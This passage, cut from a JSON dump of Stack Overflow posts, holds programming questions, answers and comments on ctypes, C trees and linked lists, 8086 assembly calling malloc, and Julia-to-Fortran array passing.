ctypes.c_char_p, ctypes.c_int32]\n\ndl.stringUpcase(IN_str, OUT_str, IN_len);\n</code></pre>\n\n<p>Console error output is </p>\n\n<pre><code> line 21, in &lt;module&gt;\n    dl.stringUpcase(IN_str, OUT_str, IN_len);\nctypes.ArgumentError: argument 1: &lt;class 'TypeError'&gt;: wrong type\n</code></pre>\n\n<p>Thank you for any help you can provide. </p>\n"}, {"tags": ["c", "tree"], "comments": [{"owner": {"reputation": 2437, "user_id": 3861775, "user_type": "registered", "accept_rate": 41, "profile_image": "https://i.stack.imgur.com/Ij1Eg.jpg?s=128&g=1", "display_name": "Samuel", "link": "https://stackoverflow.com/users/3861775/samuel"}, "reply_to_user": {"reputation": 21326, "user_id": 1679849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lpvxY.png?s=128&g=1", "display_name": "r3mainer", "link": "https://stackoverflow.com/users/1679849/r3mainer"}, "edited": false, "score": 0, "creation_date": 1499164160, "post_id": 44903286, "comment_id": 76783859, "body": "@squeamishossifrage In my case I am working with quadtrees and octrees."}, {"owner": {"reputation": 21326, "user_id": 1679849, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/lpvxY.png?s=128&g=1", "display_name": "r3mainer", "link": "https://stackoverflow.com/users/1679849/r3mainer"}, "edited": false, "score": 0, "creation_date": 1499164650, "post_id": 44903286, "comment_id": 76784201, "body": "Oh, ok. But I&#39;m afraid your question is still off-topic: <i><a href=\"https://stackoverflow.com/help/on-topic\">&quot;Questions asking us to recommend or find a book, tool, software library, tutorial or other off-site resource are off-topic for Stack Overflow as they tend to attract opinionated answers and spam. Instead, describe the problem and what has been done so far to solve it.&quot;</a></i>"}, {"owner": {"reputation": 34566, "user_id": 1475978, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/CUdQt.png?s=128&g=1", "display_name": "Nominal Animal", "link": "https://stackoverflow.com/users/1475978/nominal-animal"}, "edited": false, "score": 0, "creation_date": 1499202908, "post_id": 44903286, "comment_id": 76804613, "body": "@Samuel: To verify tree and graph structures, I recommend the program outputs the structures using the Graphviz DOT format (it&#39;s a very simple text format); then, one can use e.g. <code>dot</code> or <code>neato</code> etc. to view the structures. It is much easier, works for bigger trees, and you can even include some interesting cases (by saving the images created by the Graphviz tools) in your project folder. But, using DOT to describe a tree (or a graph) is a completely different question to doing the same by printing the tree to console using ASCII graphics."}], "owner": {"reputation": 2437, "user_id": 3861775, "user_type": "registered", "accept_rate": 41, "profile_image": "https://i.stack.imgur.com/Ij1Eg.jpg?s=128&g=1", "display_name": "Samuel", "link": "https://stackoverflow.com/users/3861775/samuel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 88, "favorite_count": 0, "closed_date": 1499180927, "answer_count": 0, "score": 0, "last_activity_date": 1499163601, "creation_date": 1499163601, "question_id": 44903286, "link": "https://stackoverflow.com/questions/44903286/visualize-tree-structure", "closed_reason": "Duplicate", "title": "Visualize Tree Structure", "body": "<p>I try to debug my program which uses a tree structure to search particles. I want to do a visual proof if the tree structure looks correctly. Therefore I want to draw the tree structure (only for small trees) in the console.</p>\n\n<p>I do the following to do a post-order walk trough the tree structure.</p>\n\n<pre><code>void treeWalk(TreeNode *t, int level){\n    if(t != NULL){\n        for(int i=0; i&lt;POWDIM; i++){\n            if(t-&gt;son[i] != NULL){\n\n                printf(\"down to son %d level %d)\\n\", i, level);\n\n                treeWalk(t-&gt;son[i], level+1);\n            }\n        }\n        // Operation on *t\n        if(isLeaf(t) == TRUE)\n            print(\"son is a leaf\\n\");\n        else\n            print(\"son is a node\"); \n        // End of operation on *t\n    }\n}\n</code></pre>\n\n<p>Where <code>isLeaf(t)</code> is a function to distinguish a particle (leaf) from a node without a particle. <code>TreeNode</code> is a structure defined as:</p>\n\n<pre><code>typedef struct TreeNode{\n    Particle p;\n    struct TreeNode *son[DIM*DIM];\n}\n</code></pre>\n\n<p>Where <code>DIM</code> is 2 or 3.</p>\n\n<p>Is there an easy way to print such a tree structure to the console? I imagine something like:</p>\n\n<pre><code>        0\n       / \\\n      /   \\\n     0     0\n    / \\   / \\\n   x   x x   x\n</code></pre>\n"}, {"tags": ["c", "assembly", "x86-16"], "comments": [{"owner": {"reputation": 1, "user_id": 8253029, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FXbR9.png?s=128&g=1", "display_name": "SpaceX", "link": "https://stackoverflow.com/users/8253029/spacex"}, "edited": false, "score": 1, "creation_date": 1499163275, "post_id": 44903081, "comment_id": 76783248, "body": "You could always search before posting a thread.. <a href=\"https://stackoverflow.com/questions/20510132/what-exactly-does-malloc-do-in-assembly\" title=\"what exactly does malloc do in assembly\">stackoverflow.com/questions/20510132/&hellip;</a>"}, {"owner": {"reputation": 484, "user_id": 5834521, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-QBMYVTwXyGs/AAAAAAAAAAI/AAAAAAAAA8M/y7HIjlZQRVA/photo.jpg?sz=128", "display_name": "Vishwajeet Vishu", "link": "https://stackoverflow.com/users/5834521/vishwajeet-vishu"}, "edited": false, "score": 2, "creation_date": 1499163353, "post_id": 44903081, "comment_id": 76783293, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/20510132/what-exactly-does-malloc-do-in-assembly\">What exactly does _malloc do in assembly?</a>"}, {"owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "edited": false, "score": 4, "creation_date": 1499163359, "post_id": 44903081, "comment_id": 76783302, "body": "Note that <code>myproc(p);</code> cannot change the value of <code>p</code>, since C is pass by value. You need <code>p = myproc();</code> or <code>myproc(&amp;p);</code>."}, {"owner": {"reputation": 165, "user_id": 3133165, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/dae6d106c76d7ff31c88cd8e6c2f7d31?s=128&d=identicon&r=PG&f=1", "display_name": "user3133165", "link": "https://stackoverflow.com/users/3133165/user3133165"}, "edited": false, "score": 0, "creation_date": 1499163594, "post_id": 44903081, "comment_id": 76783462, "body": "Yes that solved my problem!"}, {"owner": {"reputation": 221394, "user_id": 366904, "user_type": "moderator", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/3f8912af19fe86b7b34a0b011a962460?s=128&d=identicon&r=PG", "display_name": "Cody Gray", "link": "https://stackoverflow.com/users/366904/cody-gray"}, "edited": false, "score": 0, "creation_date": 1499163762, "post_id": 44903081, "comment_id": 76783566, "body": "This is <i>very</i> inefficient assembly code. Why not just let the C compiler generate instructions to call <code>malloc</code>?"}, {"owner": {"reputation": 165, "user_id": 3133165, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/dae6d106c76d7ff31c88cd8e6c2f7d31?s=128&d=identicon&r=PG&f=1", "display_name": "user3133165", "link": "https://stackoverflow.com/users/3133165/user3133165"}, "edited": false, "score": 0, "creation_date": 1499163879, "post_id": 44903081, "comment_id": 76783645, "body": "Yes it is inefficient but my goal here was to understand how the calling of malloc works from assembly,and that i needed to pass the address of the pointer from C."}, {"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1499173326, "post_id": 44903081, "comment_id": 76790458, "body": "So basically you are just looking for a way to call a C library function from assembler? In other words, looking for the calling convention to a particular function."}, {"owner": {"reputation": 15145, "user_id": 4271923, "user_type": "registered", "profile_image": "https://graph.facebook.com/543414580/picture?type=large", "display_name": "Ped7g", "link": "https://stackoverflow.com/users/4271923/ped7g"}, "edited": false, "score": 0, "creation_date": 1499177051, "post_id": 44903081, "comment_id": 76792786, "body": "That code will leak memory, as it is not calling <code>free</code>. Cpt.Obvious."}, {"owner": {"reputation": 165, "user_id": 3133165, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/dae6d106c76d7ff31c88cd8e6c2f7d31?s=128&d=identicon&r=PG&f=1", "display_name": "user3133165", "link": "https://stackoverflow.com/users/3133165/user3133165"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1499177182, "post_id": 44903081, "comment_id": 76792846, "body": "@Lundin yes and I thought I had problems with my assembly code ,but it turns out the problem was in my C code."}, {"owner": {"reputation": 14469, "user_id": 2191105, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/tPiCW.png?s=128&g=1", "display_name": "David Hoelzer", "link": "https://stackoverflow.com/users/2191105/david-hoelzer"}, "edited": false, "score": 0, "creation_date": 1499184311, "post_id": 44903081, "comment_id": 76797178, "body": "If you are already writing in C, I cannot imagine why you would create an assembly function to call a C library function."}, {"owner": {"reputation": 165, "user_id": 3133165, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/dae6d106c76d7ff31c88cd8e6c2f7d31?s=128&d=identicon&r=PG&f=1", "display_name": "user3133165", "link": "https://stackoverflow.com/users/3133165/user3133165"}, "reply_to_user": {"reputation": 14469, "user_id": 2191105, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/tPiCW.png?s=128&g=1", "display_name": "David Hoelzer", "link": "https://stackoverflow.com/users/2191105/david-hoelzer"}, "edited": false, "score": 0, "creation_date": 1499184465, "post_id": 44903081, "comment_id": 76797271, "body": "@DavidHoelzer yes it doesn&#39;t make any sense ,this just has to do with my assembly course not an actual real work."}], "answers": [{"tags": [], "owner": {"reputation": 165, "user_id": 3133165, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/dae6d106c76d7ff31c88cd8e6c2f7d31?s=128&d=identicon&r=PG&f=1", "display_name": "user3133165", "link": "https://stackoverflow.com/users/3133165/user3133165"}, "is_accepted": false, "score": 1, "last_activity_date": 1499163772, "creation_date": 1499163772, "answer_id": 44903361, "question_id": 44903081, "link": "https://stackoverflow.com/questions/44903081/how-does-malloc-in-assembly-8086-work/44903361#44903361", "title": "How does malloc in assembly 8086 work?", "body": "<p>Changing the function to <code>extern void myproc(int **arr);</code> then passing it <code>&amp;p</code>.\nAnd changing the Assembly to this:</p>\n\n<pre><code>.MODEL small\n    .STACK 100H\n    .DATA\n    .CODE\n    .386\n    .387\n    PUBLIC _myproc\n    EXTRN _malloc:NEAR\n    _myproc PROC NEAR\n    ;This procedure is supposed to do  p=malloc(sizeof(int)*4) then p[0]=1 ,p[1]=2,p[2]=3,p[3]=4.\n    PUSH BP\n    MOV BP,SP\n    XOR DX,DX\n    PUSH BX\n    PUSH SI\n    MOV AX,4;prepare to pass the parameter for malloc\n    SHL AX,1;multiply by 2 for int array\n    PUSH AX;pass 4*2 to malloc\n    CALL _malloc;calling malloc\n    ADD SP,2\n    MOV SI,WORD PTR [BP+4];get the pointer adress\n    MOV [SI],AX;set the point to point on the newly allocated array\n    ;do p[0]=1 ,p[1]=2,p[2]=3,p[3]=4\n    MOV BX,[SI]\n    MOV WORD PTR [BX],1\n    ADD BX,2\n    MOV WORD PTR [BX],2\n    ADD BX,2\n    MOV WORD PTR [BX],3\n    ADD BX,2\n    MOV WORD PTR [BX], 4\n    POP SI\n    POP BX\n    POP BP\n    RET;;when i get back to the C file to print the values it doesnt work ,its like i didn't set 1,2,3,4.\n    _myproc ENDP\n\n    END\n</code></pre>\n\n<p>Fixes it</p>\n"}], "owner": {"reputation": 165, "user_id": 3133165, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/dae6d106c76d7ff31c88cd8e6c2f7d31?s=128&d=identicon&r=PG&f=1", "display_name": "user3133165", "link": "https://stackoverflow.com/users/3133165/user3133165"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 439, "favorite_count": 0, "closed_date": 1499184290, "answer_count": 1, "score": -2, "last_activity_date": 1499163772, "creation_date": 1499163054, "question_id": 44903081, "link": "https://stackoverflow.com/questions/44903081/how-does-malloc-in-assembly-8086-work", "closed_reason": "Not suitable for this site", "title": "How does malloc in assembly 8086 work?", "body": "<p>I'm doing C and assembly ,I thought i'll write a simple code to make sure that i understand how using malloc in assembly works ,I just want to allocate a size 4 int array and fill it with 1,2,3,4 values in assembly and then print in C.</p>\n\n<p>C file:</p>\n\n<pre><code>#include &lt;stdio.h&gt; \n#include &lt;stdlib.h&gt; \n#include &lt;string.h&gt;\n#include &lt;malloc.h&gt;\nextern void myproc(int *arr); \nvoid main() {\nint *p;\nmyproc(p);//call the assembly function ,where i do p=malloc(sizeof(int)*4)\nprintf(\"%d %d %d %d \",p[0],p[1],p[2],p[3]);//supposed to print 1 2 3 4 but its not\n} // main\n</code></pre>\n\n<p>Assembly file:</p>\n\n<pre><code>.MODEL small\n    .STACK 100H\n    .DATA\n    .CODE\n    .386\n    .387\n    PUBLIC _myproc\n    EXTRN _malloc:NEAR\n    _myproc PROC NEAR\n    ;This procedure is supposed to do  p=malloc(sizeof(int)*4) then p[0]=1 ,p[1]=2,p[2]=3,p[3]=4.\n    PUSH BP\n    MOV BP,SP\n    XOR DX,DX\n    PUSH BX\n    MOV AX,4;prepare to pass the parameter for malloc\n    SHL AX,1;multiply by 2 for int array\n    PUSH AX;pass 4*2 to malloc\n    CALL _malloc;calling malloc\n    ADD SP,2\n    MOV WORD PTR [BP+4],AX;set the pointer to the newly allocated array \n    MOV BX,WORD PTR [BP+4]\n    ;do p[0]=1 ,p[1]=2,p[2]=3,p[3]=4\n    MOV WORD PTR [BX],1\n    ADD BX,2\n    MOV WORD PTR [BX],2\n    ADD BX,2\n    MOV WORD PTR [BX],3\n    ADD BX,2\n    MOV WORD PTR [BX], 4\n    POP BX\n    POP BP\n    RET;;when i get back to the C file to print the values it doesnt work ,its like i didn't set 1,2,3,4.\n    _myproc ENDP\n\n    END\n</code></pre>\n"}, {"tags": ["c", "linked-list"], "comments": [{"owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "edited": false, "score": 0, "creation_date": 1499162430, "post_id": 44902789, "comment_id": 76782701, "body": "What is <code>frame_t</code> and why are pointers to it represented as integers in your examples?"}, {"owner": {"reputation": 30168, "user_id": 5612562, "user_type": "registered", "accept_rate": 59, "profile_image": "https://i.stack.imgur.com/gzBQY.jpg?s=128&g=1", "display_name": "msc", "link": "https://stackoverflow.com/users/5612562/msc"}, "edited": false, "score": 0, "creation_date": 1499162493, "post_id": 44902789, "comment_id": 76782750, "body": "<a href=\"https://stackoverflow.com/questions/1535988/swapping-nodes-on-a-single-linked-list\" title=\"swapping nodes on a single linked list\">stackoverflow.com/questions/1535988/&hellip;</a>"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1499180187, "post_id": 44902789, "comment_id": 76794718, "body": "Although one of the duplicate questions is tagged C++, the operational code is the same as C code (but the swapping function does contain a <code>cout &lt;&lt; \u2026 &lt;&lt; endl;</code> line, which is pure C++).  That covers the more general case; the pure C question covers a more limited case of swapping adjacent nodes.  Note that one of the suggestions in the C++ question is to swap payloads instead of swapping the pointers around \u2014 that has great merit since it can be done without needing to know anything about the nodes prior to the swapped nodes."}], "answers": [{"comments": [{"owner": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "edited": false, "score": 0, "creation_date": 1499163349, "post_id": 44902875, "comment_id": 76783290, "body": "It would be better to show him duplicated question."}, {"owner": {"reputation": 5362, "user_id": 2430669, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2656586be6c90ef0666a391f1114628b?s=128&d=identicon&r=PG", "display_name": "Micha&#235;l Roy", "link": "https://stackoverflow.com/users/2430669/micha%c3%abl-roy"}, "edited": false, "score": 0, "creation_date": 1499163408, "post_id": 44902875, "comment_id": 76783342, "body": "Shouldn&#39;t the function either take a Link** as input, or return the pointer to the list head?  The head of the list changes if one of the  items is the head."}, {"owner": {"reputation": 80047, "user_id": 169346, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/645dbb4f7ba1ff9d7ff2de02f68fbe9c?s=128&d=identicon&r=PG", "display_name": "JeremyP", "link": "https://stackoverflow.com/users/169346/jeremyp"}, "edited": false, "score": 0, "creation_date": 1499163449, "post_id": 44902875, "comment_id": 76783365, "body": "I read the question as him wanting to find the items to swap based on the <i>values</i> not the position in the list.So you have to traverse the list to find the positions of both values and then swap"}, {"owner": {"reputation": 80047, "user_id": 169346, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/645dbb4f7ba1ff9d7ff2de02f68fbe9c?s=128&d=identicon&r=PG", "display_name": "JeremyP", "link": "https://stackoverflow.com/users/169346/jeremyp"}, "reply_to_user": {"reputation": 6676, "user_id": 3716664, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/fN14n.png?s=128&g=1", "display_name": "tilz0R", "link": "https://stackoverflow.com/users/3716664/tilz0r"}, "edited": false, "score": 0, "creation_date": 1499163584, "post_id": 44902875, "comment_id": 76783457, "body": "@tilz0R I disagree. The accepted answer in the duplicated question swaps the link elements. This answer just swaps the values held by the link elements which makes it a superior answer."}, {"owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "edited": false, "score": 0, "creation_date": 1499163695, "post_id": 44902875, "comment_id": 76783534, "body": "Oops, it seems I misunderstood the question completely, and wrote code to swap the wrong things."}], "tags": [], "owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "is_accepted": false, "score": 1, "last_activity_date": 1499163910, "last_edit_date": 1499163910, "creation_date": 1499162548, "answer_id": 44902875, "question_id": 44902789, "link": "https://stackoverflow.com/questions/44902789/how-can-i-swap-two-nodes-inside-linked-list-in-c/44902875#44902875", "title": "How can I swap two nodes inside linked list in C?", "body": "<p>Your question is a bit under-specified; what happens if the elements to be swapped occur more than once?</p>\n\n<p>Assuming it's ok to just swap the first instances, I would definitely write code to do it in two steps:</p>\n\n<ol>\n<li>Find the elements holding the data to swap.</li>\n<li>Swap them.</li>\n</ol>\n\n<p>Perhaps something like this:</p>\n\n<pre><code>const struct Node * find_node(const struct Node *list, frame_t *value)\n{\n  while(list != NULL)\n  {\n    if(list-&gt;frame == value)\n      return list;\n  }\n  return NULL;\n}\n\nvoid swap(struct Node *list, frame_t *value1, frame_t *value2)\n{\n  struct Node *el1 = (struct Node *) find_node(list, value1);\n  struct Node *el2 = (struct Node *) find_node(list, value2);\n  if(el1 != NULL &amp;&amp; el2 != NULL)\n  {\n    const frame_t * const f1 = el1-&gt;frame;\n    el1-&gt;frame = el2-&gt;frame;\n    el2-&gt;frame = f1;\n  }\n}\n</code></pre>\n\n<p>This will simply swap the two first found instances, if there are duplicates.</p>\n"}], "owner": {"reputation": 35, "user_id": 5371491, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/nEIrG.jpg?s=128&g=1", "display_name": "yakovd33", "link": "https://stackoverflow.com/users/5371491/yakovd33"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 99, "favorite_count": 0, "closed_date": 1499180158, "answer_count": 1, "score": 0, "last_activity_date": 1499163910, "creation_date": 1499162320, "question_id": 44902789, "link": "https://stackoverflow.com/questions/44902789/how-can-i-swap-two-nodes-inside-linked-list-in-c", "closed_reason": "Duplicate", "title": "How can I swap two nodes inside linked list in C?", "body": "<p>I have this linked list</p>\n\n<pre><code>struct Link\n{\n    frame_t *frame;\n    struct Link *next;\n};\n</code></pre>\n\n<p>Now I want to replace two of it's nodes with the function swap() so for example swap(list, 4, 7) will give me</p>\n\n<pre><code>[1, 2, 3, **7**, 5, 6, **4**, 8, 9, 10]\n</code></pre>\n\n<p>for the list with the list with contents of</p>\n\n<pre><code>[1, 2, 3, **4**, 5, 6, **7**, 8, 9, 10]\n</code></pre>\n\n<p>What I tried doing was to use the nodes before the ones I actually need to replace but I got infinite loops and nodes that have been cut.</p>\n\n<pre><code>link_t* tmp = currPrev-&gt;next;\nlink_t* tmpTwo = linkToChangePrev-&gt;next;\ntmpTwo-&gt;next = tmp-&gt;next;\ncurrPrev-&gt;next = tmpTwo;\ntmp-&gt;next = tmpTwo;\nlinkToChangePrev-&gt;next = tmpTwo;\n</code></pre>\n\n<p>What is the most effective way to change two nodes in linked list?</p>\n"}, {"tags": ["c", "fortran", "julia"], "answers": [{"tags": [], "owner": {"reputation": 554, "user_id": 8199273, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c74786754d406e4c09a33144d43f8beb?s=128&d=identicon&r=PG&f=1", "display_name": "tgregory", "link": "https://stackoverflow.com/users/8199273/tgregory"}, "is_accepted": true, "score": 3, "last_activity_date": 1499186679, "creation_date": 1499186679, "answer_id": 44910869, "question_id": 44902634, "link": "https://stackoverflow.com/questions/44902634/passing-a-2d-array-from-julia-to-fortran/44910869#44910869", "title": "Passing a 2d-array from Julia to Fortran", "body": "<p>Fortran uses call by reference even for simple integral arguments. Additionaly you are creating redundant layer of indirection here (in the both C and Fortran versions). So corrected julia wrapper for your fortran code should be:</p>\n\n<pre><code>x = zeros(Cint,5,5)\nfor i=1:5\n    for j=1:5\n        x[i,j] = i * j\n        print(x[i,j], \" \")\n    end\n    println()\nend\n\naMean = ccall((:meanfilter_, \"./tst.so\"), Float64, (Ref{Cint}, Ref{Cint}, Ref{Cint}), x, 5, 5)\nprintln(\"mean_f=\",aMean) \n</code></pre>\n\n<hr>\n\n<p>I tested this with <code>gfortran</code> so your name mangling may differ.</p>\n"}], "owner": {"reputation": 135, "user_id": 1312543, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/a36e55ed2a8e6add9297965df170fd8d?s=128&d=identicon&r=PG", "display_name": "Fuji San", "link": "https://stackoverflow.com/users/1312543/fuji-san"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 249, "favorite_count": 0, "accepted_answer_id": 44910869, "answer_count": 1, "score": 1, "last_activity_date": 1499186679, "creation_date": 1499161902, "question_id": 44902634, "link": "https://stackoverflow.com/questions/44902634/passing-a-2d-array-from-julia-to-fortran", "title": "Passing a 2d-array from Julia to Fortran", "body": "<p>I'm having trouble passing a 2d-array from Julia to Fortran.</p>\n\n<p>Passing that 2d-array to a C function works fine though.</p>\n\n<p>Here is the C code:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\ndouble meanFilter(int **arr, int row, int col)\n{\n    int i, j, sum=0;\n    float mean;\n    for (i=0; i&lt;row; i=i+1)\n        for (j=0; j&lt;col; j=j+1) {\n             sum = sum + arr[i][j];\n             printf(\"%d %d %d %d\\n\", i, j, arr[i][j], sum);\n         }\n    mean = (double)sum / (row * col);\n    printf(\"mean=%f\\n\", mean);\n    return mean;\n}\n</code></pre>\n\n<p>that i compile with</p>\n\n<pre><code>icc -o myclib.so myclib.c -fPIC -shared\n</code></pre>\n\n<p>and the Julia code where I call the C function:</p>\n\n<pre><code>x = zeros(Cint,5,5)\nfor i=1:5\n    for j=1:5\n        x[i,j] = i * j\n        print(x[i,j], \" \")\n    end\n    println()\nend\n\nrefAr = [Ref(x,i) for i=1:size(x,1):length(x)]\n\naMean = ccall((:meanFilter, :myclib), Float64, (Ptr{Ptr{Cint}}, Cint, Cint), refAr, 5, 5)\nprintln(\"mean_c=\",aMean)\n</code></pre>\n\n<p>and I get this output:</p>\n\n<pre><code>1 2 3 4 5 \n2 4 6 8 10 \n3 6 9 12 15 \n4 8 12 16 20 \n5 10 15 20 25 \n0 0 1 1\n0 1 2 3\n0 2 3 6\n0 3 4 10\n0 4 5 15\n1 0 2 17\n1 1 4 21\n1 2 6 27\n1 3 8 35\n1 4 10 45\n2 0 3 48\n2 1 6 54\n2 2 9 63\n2 3 12 75\n2 4 15 90\n3 0 4 94\n3 1 8 102\n3 2 12 114\n3 3 16 130\n3 4 20 150\n4 0 5 155\n4 1 10 165\n4 2 15 180\n4 3 20 200\n4 4 25 225\nmean=9.000000\nmean_c=9.0\n</code></pre>\n\n<p>Here is the Fortran version:</p>\n\n<pre><code>real(kind=8) function meanFilter(arr, row, col)\n    integer, intent(in) :: row, col\n    integer, dimension(row,col), intent(in) :: arr\n    integer :: i, j, sum\n\n    sum = 0\n\n    do j=1, col\n        do i = 1, row\n            sum = sum + arr(i,j)\n            write(*,*) i, j, arr(i,j), sum\n        enddo\n    enddo\n    meanFilter = real(sum,8)/(row*col)\n    write(*,*) \"mean=\", meanFilter\nend function meanFilter\n</code></pre>\n\n<p>that I compile like this:</p>\n\n<pre><code>ifort -o myflib.so myflib.f90 -assume byterecl -shared -fPIC\n</code></pre>\n\n<p>and the Julia code</p>\n\n<pre><code>x = zeros(Cint,5,5)\nfor i=1:5\n    for j=1:5\n        x[i,j] = i * j\n        print(x[i,j], \" \")\n    end\n    println()\nend\n\nrefAr = [Ref(x,i) for i=1:size(x,1):length(x)]\n\naMean = ccall((:simplemodule_mp_meanfilter_, :myflib), Float64, (Ptr{Ptr{Cint}}, Cint, Cint), refAr, 5, 5)\nprintln(\"mean_f=\",aMean)\n</code></pre>\n\n<p>and I get this output:</p>\n\n<pre><code>signal (11): Segmentation fault\nwhile loading ./fortran_call_in_julia.jl, in expression starting on line 56\nsimplemodule_mp_meanfilter_ at ./myflib.so (unknown line)\nanonymous at ./&lt;missing&gt; (unknown line)\nunknown function (ip: 0x2ab08d75fcfa)\nunknown function (ip: 0x2ab08d73b606)\njl_load at /usr/bin/../lib64/libjulia.so.0.6 (unknown line)\nunknown function (ip: 0x2ab0991bd4e5)\nunknown function (ip: 0x2ab0991bd6bb)\njl_apply_generic at /usr/bin/../lib64/libjulia.so.0.6 (unknown line)\nunknown function (ip: 0x2ab0990625bf)\nunknown function (ip: 0x2ab09906262b)\njl_apply_generic at /usr/bin/../lib64/libjulia.so.0.6 (unknown line)\nunknown function (ip: 0x2ab0991c6315)\nunknown function (ip: 0x2ab0991c87f4)\nunknown function (ip: 0x2ab0991c9288)\njl_apply_generic at /usr/bin/../lib64/libjulia.so.0.6 (unknown line)\nunknown function (ip: 0x401d90)\nunknown function (ip: 0x401592)\n__libc_start_main at /usr/bin/../lib64/libc.so.6 (unknown line)\nunknown function (ip: 0x401649)\nAllocations: 1664692 (Pool: 1663483; Big: 1209); GC: 1\nSegmentation fault (core dumped)\n</code></pre>\n\n<p>So, what is it I'm doing wrong for the fortran version?</p>\n"}, {"tags": ["c", "arrays", "indices"], "comments": [{"owner": {"reputation": 9541, "user_id": 384674, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4157684c31f0d2f3dd94e43eeab90d6d?s=128&d=identicon&r=PG", "display_name": "Betlista", "link": "https://stackoverflow.com/users/384674/betlista"}, "edited": false, "score": 0, "creation_date": 1499161677, "post_id": 44902286, "comment_id": 76782184, "body": "I&#39;d suggest you to think about how you would achieve what you want to achieve and based on that to check, whether program is doing what you want. Copying some code you do not understand won&#39;t help you to learn..."}, {"owner": {"reputation": 8510, "user_id": 1292918, "user_type": "registered", "accept_rate": 95, "profile_image": "https://www.gravatar.com/avatar/44cdb725bf1a393149554bae7f5f9d46?s=128&d=identicon&r=PG", "display_name": "Toby", "link": "https://stackoverflow.com/users/1292918/toby"}, "edited": false, "score": 0, "creation_date": 1499161729, "post_id": 44902286, "comment_id": 76782213, "body": "In addition to Betlista&#39;s comment, it would be beneficial to you to learn to use a debugger and examine the contents of the variables as they change in your program."}, {"owner": {"reputation": 362958, "user_id": 28169, "user_type": "registered", "accept_rate": 88, "profile_image": "https://www.gravatar.com/avatar/ec9385dc533f1a6a93769077f852503e?s=128&d=identicon&r=PG", "display_name": "unwind", "link": "https://stackoverflow.com/users/28169/unwind"}, "edited": false, "score": 2, "creation_date": 1499162329, "post_id": 44902286, "comment_id": 76782618, "body": "As a side note, if you&#39;re going to initialize the array from code anyway, you might as well make it a normal array rather than a heap allocation (i.e. <code>const double arr[] = { 0.00623, 0.745, ... };</code>)."}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": "https://stackoverflow.com/users/1312382/aconcagua"}, "edited": false, "score": 0, "creation_date": 1499162759, "post_id": 44902286, "comment_id": 76782924, "body": "Why do yo need an index array of size 10 if you only want to get 5 values?"}, {"owner": {"reputation": 19667, "user_id": 1312382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/FL8Fg.jpg?s=128&g=1", "display_name": "Aconcagua", "link": 